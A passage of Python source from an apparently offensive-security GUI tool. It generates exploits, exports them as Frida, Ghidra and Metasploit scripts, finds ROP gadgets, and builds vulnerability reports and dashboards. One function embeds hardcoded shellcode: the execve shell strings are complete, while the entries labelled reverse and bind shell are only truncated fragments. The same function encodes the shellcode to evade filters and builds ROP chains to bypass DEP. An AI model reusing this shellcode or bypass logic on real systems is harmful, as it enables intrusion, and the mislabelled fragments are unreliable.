                frida_script = self._generate_frida_exploitation_script(exploit, target_binary)
                if frida_script:
                    framework_integration["frida_scripts"].append(frida_script)

                # Generate Ghidra analysis scripts
                ghidra_script = self._generate_ghidra_exploitation_script(exploit, target_binary)
                if ghidra_script:
                    framework_integration["ghidra_scripts"].append(ghidra_script)

                # Create Metasploit-compatible modules
                msf_module = self._generate_metasploit_module(exploit, target_binary)
                if msf_module:
                    framework_integration["metasploit_modules"].append(msf_module)

                # Generate custom payload variations
                custom_payloads = self._generate_custom_payload_variations(exploit)
                framework_integration["custom_payloads"].extend(custom_payloads)

            # Test framework integration
            integration_status = self._test_framework_integration(framework_integration)
            framework_integration["integration_status"] = integration_status

            return framework_integration

        except Exception as e:
            logger.error(f"Framework integration failed: {e}")
            return {}

    def _validate_generated_exploits(self, generated_exploits, target_binary):
        """Validate generated exploits in controlled testing environments."""
        try:
            validation_results = {
                "total_exploits": len(generated_exploits),
                "successful_validations": 0,
                "failed_validations": 0,
                "exploit_results": {},
                "performance_metrics": {},
                "reliability_scores": {}
            }

            for i, exploit in enumerate(generated_exploits):
                exploit_id = f"exploit_{i}"

                # Create isolated testing environment
                test_env = self._create_isolated_test_environment(target_binary)

                if not test_env:
                    validation_results["exploit_results"][exploit_id] = {
                        "status": "failed",
                        "reason": "Failed to create test environment"
                    }
                    validation_results["failed_validations"] += 1
                    continue

                try:
                    # Execute exploit in controlled environment
                    execution_result = self._execute_exploit_safely(exploit, test_env)

                    # Analyze exploitation success
                    success_analysis = self._analyze_exploitation_success(
                        execution_result, exploit, test_env
                    )

                    # Performance and reliability metrics
                    performance_metrics = self._measure_exploit_performance(
                        execution_result, exploit
                    )

                    validation_results["exploit_results"][exploit_id] = {
                        "status": "success" if success_analysis["successful"] else "failed",
                        "execution_result": execution_result,
                        "success_analysis": success_analysis,
                        "performance_metrics": performance_metrics
                    }

                    if success_analysis["successful"]:
                        validation_results["successful_validations"] += 1
                    else:
                        validation_results["failed_validations"] += 1

                    validation_results["performance_metrics"][exploit_id] = performance_metrics
                    validation_results["reliability_scores"][exploit_id] = success_analysis.get("reliability_score", 0.0)

                finally:
                    # Clean up test environment
                    self._cleanup_test_environment(test_env)

            return validation_results

        except Exception as e:
            logger.error(f"Exploit validation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _find_rop_gadgets(self, target_binary, architecture):
        """Find ROP gadgets in target binary for exploit construction."""
        try:
            gadgets = {
                "pop_ret": [],
                "mov_ret": [],
                "add_ret": [],
                "syscall": [],
                "jmp_reg": [],
                "call_reg": []
            }

            # Use objdump or similar to find gadget sequences
            try:
                objdump_path = shutil.which("objdump")
                if not objdump_path:
                    pass  # Fall through to manual analysis
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [objdump_path, "-d", target_binary],
                    capture_output=True, text=True, timeout=30, shell=False
                )

                if result.returncode == 0:
                    gadgets = self._parse_rop_gadgets_from_disasm(result.stdout, architecture)

            except (subprocess.TimeoutExpired, FileNotFoundError):
                # Fallback to manual binary analysis
                gadgets = self._manual_gadget_search(target_binary, architecture)

            return gadgets

        except Exception as e:
            logger.error(f"ROP gadget search failed: {e}")
            return {}

    def _generate_architecture_shellcode(self, architecture, protections):
        """Generate architecture-specific shellcode with protection bypasses."""
        try:
            shellcode_templates = {
                "x86_64": {
                    "execve_shell": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
                    "reverse_shell": b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xff\xc0\x48\x89\xc7\x48\xff\xc0",
                    "bind_shell": b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e"
                },
                "x86": {
                    "execve_shell": b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
                    "reverse_shell": b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02",
                    "bind_shell": b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02"
                },
                "arm64": {
                    "execve_shell": b"\x00\x00\x80\xd2\x81\x11\x80\xd2\x01\x10\x00\xf9\x20\x00\x80\xd2\x01\x00\x00\xd4",
                    "reverse_shell": b"\x60\x00\x80\xd2\x81\x00\x80\xd2\xa2\x00\x80\xd2\xc3\x00\x80\xd2\x01\x00\x00\xd4",
                    "bind_shell": b"\x40\x00\x80\xd2\x61\x00\x80\xd2\x82\x00\x80\xd2\xa3\x00\x80\xd2\x01\x00\x00\xd4"
                }
            }

            arch_templates = shellcode_templates.get(architecture, shellcode_templates["x86_64"])

            # Apply protection-specific modifications
            shellcode_data = {
                "base_shellcode": arch_templates["execve_shell"],
                "encoded_versions": {},
                "protection_bypasses": {}
            }

            # Generate encoded versions to bypass filters
            if protections.get("stack_canary", False):
                shellcode_data["encoded_versions"]["xor_encoded"] = self._xor_encode_shellcode(
                    arch_templates["execve_shell"]
                )

            if protections.get("dep_enabled", False):
                shellcode_data["protection_bypasses"]["rop_shellcode"] = self._create_rop_shellcode(
                    arch_templates["execve_shell"], architecture
                )

            # Generate alternative payloads
            shellcode_data["alternatives"] = {
                "reverse_shell": arch_templates.get("reverse_shell", b""),
                "bind_shell": arch_templates.get("bind_shell", b"")
            }

            return shellcode_data

        except Exception as e:
            logger.error(f"Shellcode generation failed: {e}")
            return {"base_shellcode": b"", "encoded_versions": {}, "protection_bypasses": {}}

    def _enhance_reporting_capabilities(self, vulnerability_data, exploitation_results=None, campaign_data=None):
        """Enhance reporting and export capabilities with comprehensive documentation."""
        try:
            enhanced_reports = {
                "executive_summary": {},
                "technical_report": {},
                "vulnerability_matrix": {},
                "exploitation_report": {},
                "remediation_guide": {},
                "export_formats": {},
                "interactive_elements": {}
            }

            # Generate executive summary
            executive_summary = self._generate_executive_summary(
                vulnerability_data, exploitation_results, campaign_data
            )
            enhanced_reports["executive_summary"] = executive_summary

            # Generate detailed technical report
            technical_report = self._generate_technical_report(
                vulnerability_data, exploitation_results, campaign_data
            )
            enhanced_reports["technical_report"] = technical_report

            # Create vulnerability risk matrix
            risk_matrix = self._create_vulnerability_risk_matrix(vulnerability_data)
            enhanced_reports["vulnerability_matrix"] = risk_matrix

            # Generate exploitation assessment report
            if exploitation_results:
                exploitation_report = self._generate_exploitation_assessment_report(
                    exploitation_results, vulnerability_data
                )
                enhanced_reports["exploitation_report"] = exploitation_report

            # Create comprehensive remediation guide
            remediation_guide = self._generate_comprehensive_remediation_guide(
                vulnerability_data, exploitation_results
            )
            enhanced_reports["remediation_guide"] = remediation_guide

            # Generate multiple export formats
            export_formats = self._generate_multiple_export_formats(enhanced_reports)
            enhanced_reports["export_formats"] = export_formats

            # Create interactive report elements
            interactive_elements = self._create_interactive_report_elements(enhanced_reports)
            enhanced_reports["interactive_elements"] = interactive_elements

            return enhanced_reports

        except Exception as e:
            logger.error(f"Enhanced reporting generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_executive_summary(self, vulnerability_data, exploitation_results, campaign_data):
        """Generate executive summary with high-level findings and business impact."""
        try:
            # Analyze vulnerability severity distribution
            severity_counts = defaultdict(int)
            critical_findings = []
            business_impact_areas = set()

            for vuln in vulnerability_data:
                severity = vuln.get("severity", "unknown").lower()
                severity_counts[severity] += 1

                if severity in ["critical", "high"]:
                    critical_findings.append({
                        "type": vuln.get("type", "unknown"),
                        "location": vuln.get("location", ""),
                        "impact": vuln.get("business_impact", "unknown"),
                        "exploitable": self._assess_exploitability(vuln, exploitation_results)
                    })

                # Categorize business impact
                if vuln.get("affects_authentication", False):
                    business_impact_areas.add("Authentication Systems")
                if vuln.get("affects_data_integrity", False):
                    business_impact_areas.add("Data Integrity")
                if vuln.get("affects_availability", False):
                    business_impact_areas.add("Service Availability")
                if vuln.get("affects_confidentiality", False):
                    business_impact_areas.add("Data Confidentiality")

            # Calculate overall security posture score
            security_posture = self._calculate_security_posture_score(
                severity_counts, len(vulnerability_data), exploitation_results
            )

            # Generate key metrics
            key_metrics = {
                "total_vulnerabilities": len(vulnerability_data),
                "critical_count": severity_counts["critical"],
                "high_count": severity_counts["high"],
                "medium_count": severity_counts["medium"],
                "low_count": severity_counts["low"],
                "exploitable_count": len([f for f in critical_findings if f["exploitable"]]),
                "security_posture_score": security_posture,
                "affected_business_areas": len(business_impact_areas)
            }

            # Generate executive recommendations
            executive_recommendations = self._generate_executive_recommendations(
                critical_findings, security_posture, business_impact_areas
            )

            executive_summary = {
                "key_metrics": key_metrics,
                "security_posture_score": security_posture,
                "critical_findings": critical_findings[:5],  # Top 5 critical issues
                "business_impact_areas": list(business_impact_areas),
                "executive_recommendations": executive_recommendations,
                "risk_assessment": self._generate_risk_assessment_summary(severity_counts),
                "immediate_actions": self._identify_immediate_actions(critical_findings),
                "timeline_recommendations": self._generate_remediation_timeline(critical_findings)
            }

            return executive_summary

        except Exception as e:
            logger.error(f"Executive summary generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_technical_report(self, vulnerability_data, exploitation_results, campaign_data):
        """Generate comprehensive technical report with detailed analysis."""
        try:
            technical_sections = {
                "methodology": self._document_testing_methodology(campaign_data),
                "vulnerability_analysis": {},
                "exploitation_analysis": {},
                "code_analysis": {},
                "network_analysis": {},
                "configuration_analysis": {},
                "recommendations": {}
            }

            # Detailed vulnerability analysis by category
            vuln_categories = defaultdict(list)
            for vuln in vulnerability_data:
                category = vuln.get("category", "uncategorized")
                vuln_categories[category].append(vuln)

            detailed_vuln_analysis = {}
            for category, vulns in vuln_categories.items():
                detailed_vuln_analysis[category] = {
                    "count": len(vulns),
                    "severity_breakdown": self._analyze_category_severity(vulns),
                    "common_patterns": self._identify_common_vulnerability_patterns(vulns),
                    "technical_details": self._extract_technical_vulnerability_details(vulns),
                    "proof_of_concept": self._generate_category_poc(vulns, exploitation_results),
                    "mitigation_strategies": self._get_category_specific_mitigations(category)
                }

            technical_sections["vulnerability_analysis"] = detailed_vuln_analysis

            # Exploitation analysis
            if exploitation_results:
                exploitation_analysis = {
                    "exploit_success_rate": self._calculate_exploit_success_rate(exploitation_results),
                    "attack_vectors": self._analyze_attack_vectors(exploitation_results),
                    "privilege_escalation": self._analyze_privilege_escalation_paths(exploitation_results),
                    "persistence_mechanisms": self._analyze_persistence_mechanisms(exploitation_results),
                    "lateral_movement": self._analyze_lateral_movement_potential(exploitation_results),
                    "payload_analysis": self._analyze_payload_effectiveness(exploitation_results)
                }
                technical_sections["exploitation_analysis"] = exploitation_analysis

            # Code quality analysis
            code_analysis = {
                "static_analysis_findings": self._summarize_static_analysis_findings(vulnerability_data),
                "dynamic_analysis_findings": self._summarize_dynamic_analysis_findings(vulnerability_data),
                "code_quality_metrics": self._calculate_code_quality_metrics(vulnerability_data),
                "architectural_issues": self._identify_architectural_security_issues(vulnerability_data),
                "secure_coding_violations": self._identify_secure_coding_violations(vulnerability_data)
            }
            technical_sections["code_analysis"] = code_analysis

            # Network security analysis
            network_analysis = {
                "network_vulnerabilities": self._analyze_network_vulnerabilities(vulnerability_data),
                "protocol_security": self._analyze_protocol_security(vulnerability_data),
                "encryption_assessment": self._analyze_encryption_implementation(vulnerability_data),
                "network_topology": self._analyze_network_topology_risks(vulnerability_data)
            }
            technical_sections["network_analysis"] = network_analysis

            # Configuration security analysis
            config_analysis = {
                "security_misconfigurations": self._analyze_security_misconfigurations(vulnerability_data),
                "hardening_opportunities": self._identify_hardening_opportunities(vulnerability_data),
                "compliance_gaps": self._identify_compliance_gaps(vulnerability_data),
                "configuration_drift": self._analyze_configuration_drift(vulnerability_data)
            }
            technical_sections["configuration_analysis"] = config_analysis

            # Technical recommendations
            technical_recommendations = {
                "immediate_fixes": self._generate_immediate_technical_fixes(vulnerability_data),
                "architectural_improvements": self._suggest_architectural_improvements(vulnerability_data),
                "security_controls": self._recommend_security_controls(vulnerability_data),
                "monitoring_improvements": self._recommend_monitoring_improvements(vulnerability_data),
                "testing_improvements": self._recommend_testing_improvements(campaign_data)
            }
            technical_sections["recommendations"] = technical_recommendations

            return technical_sections

        except Exception as e:
            logger.error(f"Technical report generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _create_vulnerability_risk_matrix(self, vulnerability_data):
        """Create comprehensive vulnerability risk matrix with multiple dimensions."""
        try:
            # Initialize risk matrix dimensions
            risk_matrix = {
                "severity_likelihood": {},
                "category_impact": {},
                "exploitability_timeline": {},
                "business_risk": {},
                "technical_risk": {},
                "matrix_visualizations": {}
            }

            # Severity vs Likelihood matrix
            severity_levels = ["critical", "high", "medium", "low"]
            likelihood_levels = ["very_high", "high", "medium", "low", "very_low"]

            severity_likelihood_matrix = {}
            for severity in severity_levels:
                severity_likelihood_matrix[severity] = {}
                for likelihood in likelihood_levels:
                    severity_likelihood_matrix[severity][likelihood] = []

            # Populate matrices with vulnerability data
            for vuln in vulnerability_data:
                severity = vuln.get("severity", "unknown").lower()
                likelihood = self._assess_exploitation_likelihood(vuln)

                if severity in severity_likelihood_matrix and likelihood in severity_likelihood_matrix[severity]:
                    severity_likelihood_matrix[severity][likelihood].append({
                        "id": vuln.get("id", "unknown"),
                        "type": vuln.get("type", "unknown"),
                        "location": vuln.get("location", ""),
                        "cvss_score": vuln.get("cvss_score", 0.0)
                    })

            risk_matrix["severity_likelihood"] = severity_likelihood_matrix

            # Category vs Business Impact matrix
            categories = ["injection", "auth", "crypto", "buffer_overflow", "logic_flaw", "config"]
            impact_areas = ["confidentiality", "integrity", "availability", "authentication"]

            category_impact_matrix = {}
            for category in categories:
                category_impact_matrix[category] = {}
                for impact in impact_areas:
                    category_vulns = [v for v in vulnerability_data
                                     if v.get("category", "").lower() == category
                                     and impact in v.get("business_impact", "").lower()]
                    category_impact_matrix[category][impact] = len(category_vulns)

            risk_matrix["category_impact"] = category_impact_matrix

            # Exploitability vs Remediation Timeline matrix
            exploitability_levels = ["trivial", "easy", "moderate", "difficult", "very_difficult"]
            timeline_ranges = ["immediate", "1_week", "1_month", "3_months", "6_months"]

            exploitability_timeline_matrix = {}
            for exploit_level in exploitability_levels:
                exploitability_timeline_matrix[exploit_level] = {}
                for timeline in timeline_ranges:
                    matching_vulns = []
                    for vuln in vulnerability_data:
                        if (self._assess_exploitability_level(vuln) == exploit_level and
                            self._estimate_remediation_timeline(vuln) == timeline):
                            matching_vulns.append(vuln)
                    exploitability_timeline_matrix[exploit_level][timeline] = len(matching_vulns)

            risk_matrix["exploitability_timeline"] = exploitability_timeline_matrix

            # Generate risk scores and prioritization
            risk_scores = self._calculate_comprehensive_risk_scores(vulnerability_data)
            risk_matrix["risk_scores"] = risk_scores

            # Create matrix visualizations data
            visualizations = {
                "heatmap_data": self._generate_risk_heatmap_data(risk_matrix),
                "scatter_plot_data": self._generate_risk_scatter_data(vulnerability_data),
                "trend_analysis": self._generate_risk_trend_analysis(vulnerability_data),
                "priority_ranking": self._generate_priority_ranking(risk_scores)
            }
            risk_matrix["matrix_visualizations"] = visualizations

            return risk_matrix

        except Exception as e:
            logger.error(f"Risk matrix creation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_multiple_export_formats(self, enhanced_reports):
        """Generate reports in multiple formats for different stakeholders."""
        try:
            export_formats = {
                "formats_available": [],
                "html_report": "",
                "pdf_data": "",
                "json_export": {},
                "csv_export": "",
                "xml_export": "",
                "markdown_report": "",
                "excel_workbook": None,
                "interactive_dashboard": {}
            }

            # Generate HTML report with interactive elements
            html_report = self._generate_html_report(enhanced_reports)
            export_formats["html_report"] = html_report
            export_formats["formats_available"].append("html")

            # Generate structured JSON export
            json_export = self._generate_json_export(enhanced_reports)
            export_formats["json_export"] = json_export
            export_formats["formats_available"].append("json")

            # Generate CSV export for vulnerability data
            csv_export = self._generate_csv_export(enhanced_reports)
            export_formats["csv_export"] = csv_export
            export_formats["formats_available"].append("csv")

            # Generate XML export for enterprise integration
            xml_export = self._generate_xml_export(enhanced_reports)
            export_formats["xml_export"] = xml_export
            export_formats["formats_available"].append("xml")

            # Generate Markdown report for documentation
            markdown_report = self._generate_markdown_report(enhanced_reports)
            export_formats["markdown_report"] = markdown_report
            export_formats["formats_available"].append("markdown")

            # Generate Excel workbook with multiple sheets
            excel_data = self._generate_excel_export_data(enhanced_reports)
            export_formats["excel_workbook"] = excel_data
            export_formats["formats_available"].append("excel")

            # Generate PDF report data
            pdf_data = self._generate_pdf_report_data(enhanced_reports)
            export_formats["pdf_data"] = pdf_data
            export_formats["formats_available"].append("pdf")

            # Generate interactive dashboard data
            dashboard_data = self._generate_interactive_dashboard_data(enhanced_reports)
            export_formats["interactive_dashboard"] = dashboard_data
            export_formats["formats_available"].append("dashboard")

            return export_formats

        except Exception as e:
            logger.error(f"Export format generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _create_interactive_report_elements(self, enhanced_reports):
        """Create interactive elements for web-based reports."""
        try:
            interactive_elements = {
                "vulnerability_timeline": {},
                "risk_heatmaps": {},
                "exploit_chains": {},
                "remediation_tracker": {},
                "compliance_dashboard": {},
                "search_filters": {},
                "drill_down_capabilities": {}
            }

            # Interactive vulnerability timeline
            timeline_data = {
                "timeline_events": self._extract_vulnerability_timeline_events(enhanced_reports),
                "severity_overlay": self._generate_severity_timeline_overlay(enhanced_reports),
                "category_breakdown": self._generate_timeline_category_breakdown(enhanced_reports),
                "interactive_controls": {
                    "time_range_selector": True,
                    "severity_filters": ["critical", "high", "medium", "low"],
                    "category_filters": ["injection", "auth", "crypto", "overflow", "logic"],
                    "zoom_capabilities": True
                }
            }
            interactive_elements["vulnerability_timeline"] = timeline_data

            # Interactive risk heatmaps
            heatmap_data = {
                "risk_matrices": enhanced_reports.get("vulnerability_matrix", {}).get("matrix_visualizations", {}),
                "hover_details": self._generate_heatmap_hover_details(enhanced_reports),
                "click_through_data": self._generate_heatmap_click_data(enhanced_reports),
                "color_schemes": {
                    "default": ["#00ff00", "#ffff00", "#ff8000", "#ff0000", "#800000"],
                    "colorblind": ["#2166ac", "#5aae61", "#fee08b", "#f46d43", "#a50026"],
                    "grayscale": ["#f7f7f7", "#d9d9d9", "#969696", "#525252", "#252525"]
                }
            }
            interactive_elements["risk_heatmaps"] = heatmap_data

            # Interactive exploit chain visualization
            if "exploitation_report" in enhanced_reports:
                exploit_chains = {
                    "chain_diagrams": self._generate_exploit_chain_diagrams(enhanced_reports["exploitation_report"]),
                    "node_interactions": self._generate_exploit_node_interactions(enhanced_reports["exploitation_report"]),
                    "success_probability": self._calculate_chain_success_probabilities(enhanced_reports["exploitation_report"]),
                    "attack_paths": self._map_attack_path_visualizations(enhanced_reports["exploitation_report"])
                }
                interactive_elements["exploit_chains"] = exploit_chains

            # Remediation progress tracker
            remediation_tracker = {
                "progress_bars": self._generate_remediation_progress_data(enhanced_reports),
                "milestone_tracking": self._generate_milestone_tracking_data(enhanced_reports),
                "resource_allocation": self._generate_resource_allocation_data(enhanced_reports),
                "timeline_visualization": self._generate_remediation_timeline_viz(enhanced_reports)
            }
            interactive_elements["remediation_tracker"] = remediation_tracker

            # Compliance dashboard
            compliance_data = {
                "standards_coverage": self._analyze_compliance_standards_coverage(enhanced_reports),
                "gap_analysis": self._generate_compliance_gap_analysis(enhanced_reports),
                "control_mapping": self._map_vulnerabilities_to_controls(enhanced_reports),
                "audit_readiness": self._assess_audit_readiness(enhanced_reports)
            }
            interactive_elements["compliance_dashboard"] = compliance_data

            # Advanced search and filter capabilities
            search_filters = {
                "full_text_search": True,
                "advanced_filters": {
                    "severity": ["critical", "high", "medium", "low"],
                    "category": ["injection", "auth", "crypto", "overflow", "logic", "config"],
                    "exploitability": ["trivial", "easy", "moderate", "difficult"],
                    "business_impact": ["high", "medium", "low"],
                    "remediation_status": ["pending", "in_progress", "completed", "verified"]
                },
                "saved_searches": self._generate_default_saved_searches(),
                "export_filtered_results": True
            }
            interactive_elements["search_filters"] = search_filters

            # Drill-down capabilities
            drill_down = {
                "vulnerability_details": self._generate_drill_down_structure(enhanced_reports),
                "evidence_links": self._generate_evidence_links(enhanced_reports),
                "related_findings": self._generate_related_findings_mapping(enhanced_reports),
                "historical_context": self._generate_historical_context_links(enhanced_reports)
            }
            interactive_elements["drill_down_capabilities"] = drill_down

            return interactive_elements

        except Exception as e:
            logger.error(f"Interactive elements creation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _refine_ui_ux_with_interactive_visualizations(self):
        """Refine UI/UX with interactive visualizations and enhanced user experience."""
        try:
            # Initialize interactive visualization components
            self._setup_interactive_dashboard()
            self._create_real_time_visualization_panels()
            self._implement_dynamic_filtering_interface()
            self._add_interactive_vulnerability_explorer()
            self._enhance_progress_visualization()
            self._implement_responsive_layout_system()
            self._add_contextual_help_system()
            self._create_interactive_risk_assessment_ui()

            logger.info("UI/UX refinements with interactive visualizations completed successfully")
            return {"status": "success", "message": "Interactive visualizations implemented"}

        except Exception as e:
            logger.error(f"UI/UX refinement failed: {e}")
            return {"status": "error", "message": str(e)}

    def _setup_interactive_dashboard(self):
        """Setup interactive dashboard with real-time metrics and visualizations."""
        try:
            # Create dashboard container
            self.dashboard_widget = QWidget()
            dashboard_layout = QGridLayout(self.dashboard_widget)

            # Real-time metrics cards
            self._create_metrics_cards_grid(dashboard_layout)

            # Interactive vulnerability overview chart
            self._create_vulnerability_overview_chart(dashboard_layout)

            # Risk trend analysis chart
            self._create_risk_trend_chart(dashboard_layout)

            # Exploitability heat map
            self._create_exploitability_heatmap(dashboard_layout)

            # Campaign progress visualization
            self._create_campaign_progress_viz(dashboard_layout)

            # Add dashboard to main layout
            if hasattr(self, 'main_splitter'):
                self.main_splitter.addWidget(self.dashboard_widget)

        except Exception as e:
            logger.error(f"Interactive dashboard setup failed: {e}")

    def _create_metrics_cards_grid(self, parent_layout):
        """Create interactive metrics cards with real-time updates."""
        try:
            metrics_container = QWidget()
            metrics_layout = QGridLayout(metrics_container)

            # Critical vulnerabilities card
            critical_card = self._create_animated_metric_card(
                "Critical Vulnerabilities", "0", "#dc3545", self._update_critical_count
            )
            metrics_layout.addWidget(critical_card, 0, 0)

            # High vulnerabilities card
            high_card = self._create_animated_metric_card(
                "High Vulnerabilities", "0", "#fd7e14", self._update_high_count
            )
            metrics_layout.addWidget(high_card, 0, 1)

            # Exploitable vulnerabilities card
            exploitable_card = self._create_animated_metric_card(
                "Exploitable", "0", "#198754", self._update_exploitable_count
            )
            metrics_layout.addWidget(exploitable_card, 0, 2)

            # Security posture score card
            posture_card = self._create_animated_metric_card(
                "Security Posture", "0%", "#0d6efd", self._update_posture_score
            )
            metrics_layout.addWidget(posture_card, 0, 3)

            # Campaign progress card
            progress_card = self._create_animated_metric_card(
                "Campaign Progress", "0%", "#6f42c1", self._update_campaign_progress
            )
            metrics_layout.addWidget(progress_card, 1, 0)

            # Coverage percentage card
            coverage_card = self._create_animated_metric_card(
                "Code Coverage", "0%", "#20c997", self._update_coverage_metric
            )
            metrics_layout.addWidget(coverage_card, 1, 1)

            # Average CVSS score card
            cvss_card = self._create_animated_metric_card(
                "Avg CVSS Score", "0.0", "#ffc107", self._update_cvss_average
            )
            metrics_layout.addWidget(cvss_card, 1, 2)

            # Remediation timeline card
            timeline_card = self._create_animated_metric_card(
                "Avg Fix Time", "0 days", "#e83e8c", self._update_remediation_timeline
            )
            metrics_layout.addWidget(timeline_card, 1, 3)

            parent_layout.addWidget(metrics_container, 0, 0, 1, 4)

        except Exception as e:
            logger.error(f"Metrics cards creation failed: {e}")

    def _create_animated_metric_card(self, title, initial_value, color, update_callback):
        """Create animated metric card with hover effects and real-time updates."""
        try:
            card = QGroupBox(title)
            card.setStyleSheet(f"""
                QGroupBox {{
                    font-weight: bold;
                    font-size: 12px;
                    border: 2px solid {color};
                    border-radius: 8px;
                    margin: 5px;
                    padding: 10px;
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                        stop:0 {color}20, stop:1 {color}10);
                    transition: all 0.3s ease;
                }}
                QGroupBox:hover {{
                    border: 3px solid {color};
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                        stop:0 {color}30, stop:1 {color}15);
                }}
                QGroupBox::title {{
                    color: {color};
                    subcontrol-origin: margin;
                    left: 10px;
                    padding: 0 5px 0 5px;
                }}
            """)

            layout = QHBoxLayout(card)

            # Main value label
            value_label = QLabel(initial_value)
            value_label.setStyleSheet(f"""
                QLabel {{
                    font-size: 24px;
                    font-weight: bold;
                    color: {color};
                    text-align: center;
                }}
            """)
            value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

            # Trend indicator (up/down arrow)
            trend_label = QLabel("")
            trend_label.setStyleSheet("""
                QLabel {
                    font-size: 16px;
                    color: #28a745;
                }
            """)

            layout.addWidget(value_label)
            layout.addWidget(trend_label)

            # Store update callback for real-time updates
            card.update_callback = update_callback
            card.value_label = value_label
            card.trend_label = trend_label

            return card

        except Exception as e:
            logger.error(f"Animated metric card creation failed: {e}")
            return QGroupBox("Error")

    def _create_vulnerability_overview_chart(self, parent_layout):
        """Create interactive vulnerability overview chart with drill-down capabilities."""
        try:
            chart_container = QGroupBox("Vulnerability Distribution")
            chart_layout = QVBoxLayout(chart_container)

            # Chart controls
            controls_layout = QHBoxLayout()

            # Chart type selector
            chart_type_combo = QComboBox()
            chart_type_combo.addItems(["Pie Chart", "Bar Chart", "Donut Chart", "Stacked Bar"])
            chart_type_combo.currentTextChanged.connect(self._update_overview_chart_type)

            # Time range selector
            time_range_combo = QComboBox()
            time_range_combo.addItems(["Last 24h", "Last Week", "Last Month", "All Time"])
            time_range_combo.currentTextChanged.connect(self._update_overview_time_range)

            # Refresh button
            refresh_btn = QPushButton(" Refresh")
            refresh_btn.clicked.connect(self._refresh_overview_chart)

            controls_layout.addWidget(QLabel("Chart Type:"))
            controls_layout.addWidget(chart_type_combo)
            controls_layout.addWidget(QLabel("Time Range:"))
            controls_layout.addWidget(time_range_combo)
            controls_layout.addWidget(refresh_btn)
            controls_layout.addStretch()

            chart_layout.addLayout(controls_layout)

            # Chart display area (placeholder for actual chart implementation)
            chart_display = QLabel(" Interactive Chart Area\n\nVulnerability distribution by:\n Severity\n Category\n Exploitability\n Timeline")
            chart_display.setStyleSheet("""
                QLabel {
                    border: 2px dashed #0d6efd;
                    border-radius: 8px;
                    padding: 20px;
                    text-align: center;
                    font-size: 14px;
                    color: #0d6efd;
                    background: #f8f9fa;
                    min-height: 200px;
                }
            """)
            chart_display.setAlignment(Qt.AlignmentFlag.AlignCenter)

            chart_layout.addWidget(chart_display)

            # Chart legend with interactive elements
            legend_layout = QHBoxLayout()
            legend_items = [
                ("Critical", "#dc3545"), ("High", "#fd7e14"),
                ("Medium", "#ffc107"), ("Low", "#198754")
            ]

            for name, color in legend_items:
                legend_item = self._create_interactive_legend_item(name, color)
                legend_layout.addWidget(legend_item)

            legend_layout.addStretch()
            chart_layout.addLayout(legend_layout)

            parent_layout.addWidget(chart_container, 1, 0, 2, 2)
            self.vulnerability_overview_chart = chart_container

        except Exception as e:
            logger.error(f"Vulnerability overview chart creation failed: {e}")

    def _create_risk_trend_chart(self, parent_layout):
        """Create interactive risk trend analysis chart."""
        try:
            trend_container = QGroupBox("Risk Trend Analysis")
            trend_layout = QVBoxLayout(trend_container)

            # Trend controls
            trend_controls = QHBoxLayout()

            # Metric selector
            metric_combo = QComboBox()
            metric_combo.addItems([
                "Overall Risk Score", "Critical Findings", "Exploitability Index",
                "Remediation Progress", "Coverage Metrics"
            ])
            metric_combo.currentTextChanged.connect(self._update_trend_metric)

            # Period selector
            period_combo = QComboBox()
            period_combo.addItems(["1 Day", "1 Week", "1 Month", "3 Months", "1 Year"])
            period_combo.currentTextChanged.connect(self._update_trend_period)

            # Smoothing toggle
            smoothing_check = QCheckBox("Smooth Curve")
            smoothing_check.toggled.connect(self._toggle_trend_smoothing)

            trend_controls.addWidget(QLabel("Metric:"))
            trend_controls.addWidget(metric_combo)
            trend_controls.addWidget(QLabel("Period:"))
            trend_controls.addWidget(period_combo)
            trend_controls.addWidget(smoothing_check)
            trend_controls.addStretch()

            trend_layout.addLayout(trend_controls)

            # Trend chart area
            trend_display = QLabel(" Risk Trend Visualization\n\nReal-time trend analysis showing:\n Risk score evolution\n Vulnerability discovery rate\n Remediation velocity\n Security posture improvement")
            trend_display.setStyleSheet("""
                QLabel {
                    border: 2px solid #198754;
                    border-radius: 8px;
                    padding: 15px;
                    text-align: center;
                    font-size: 13px;
                    color: #198754;
                    background: #f1f8e9;
                    min-height: 180px;
                }
            """)
            trend_display.setAlignment(Qt.AlignmentFlag.AlignCenter)

            trend_layout.addWidget(trend_display)

            parent_layout.addWidget(trend_container, 1, 2, 2, 2)
            self.risk_trend_chart = trend_container

        except Exception as e:
            logger.error(f"Risk trend chart creation failed: {e}")

    def _create_exploitability_heatmap(self, parent_layout):
        """Create interactive exploitability heatmap visualization."""
        try:
            heatmap_container = QGroupBox("Exploitability Heat Map")
            heatmap_layout = QVBoxLayout(heatmap_container)

            # Heatmap controls
            heatmap_controls = QHBoxLayout()

            # Dimension selectors
            x_axis_combo = QComboBox()
            x_axis_combo.addItems(["Severity", "Category", "Timeline", "Complexity"])
            x_axis_combo.currentTextChanged.connect(self._update_heatmap_x_axis)

            y_axis_combo = QComboBox()
            y_axis_combo.addItems(["Likelihood", "Impact", "Effort", "Detection"])
            y_axis_combo.currentTextChanged.connect(self._update_heatmap_y_axis)

            # Color scheme selector
            color_scheme_combo = QComboBox()
